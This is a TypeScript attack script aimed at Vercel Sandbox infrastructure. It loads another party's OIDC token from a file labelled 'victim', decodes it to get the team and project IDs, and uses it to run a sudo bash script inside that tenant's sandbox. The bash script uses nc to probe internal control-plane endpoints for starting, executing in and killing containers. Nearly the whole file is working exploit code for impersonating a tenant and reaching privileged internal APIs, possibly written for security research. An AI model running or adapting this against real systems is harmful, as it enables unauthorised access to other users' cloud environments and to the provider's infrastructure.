import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = String.raw`
set +e
for port in 23456 30001 30002; do
  echo "#################### PORT $port ####################"
  for path in \
    /vercel.hive.celld.api.v1.Celld/StartContainer \
    /vercel.hive.celld.api.v1.Celld/UnregisterPort \
    /vercel.hive.celld.api.v1.Celld/Health \
    /vercel.hive.celld.api.v1.Celld/Ping \
    /vercel.hive.cell.api.containers.v1.Containers/Create \
    /vercel.hive.cell.api.containers.v1.Containers/Start \
    /vercel.hive.cell.api.containers.v1.Containers/Exec \
    /vercel.hive.cell.api.containers.v1.Containers/Kill \
    /vercel.hive.host.api.v1.Host/GetResourceUsage \
    /vercel.hive.host.api.v1.Host/GetOCIImageConfig \
    /vercel.hive.api.cells.v1.Cells/GetCellAddress \
    /vercel.sandbox.spawn.v1.SpawnService/Ping \
    /grpc.health.v1.Health/Check; do
    echo "--- :$port $path ---"
    printf 'POST %s HTTP/1.1\r\nHost: cell\r\nContent-Type: application/json\r\nConnect-Protocol-Version: 1\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}' "$path" | timeout 2 nc 127.0.0.1 $port 2>&1 | head -4
  done
done
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });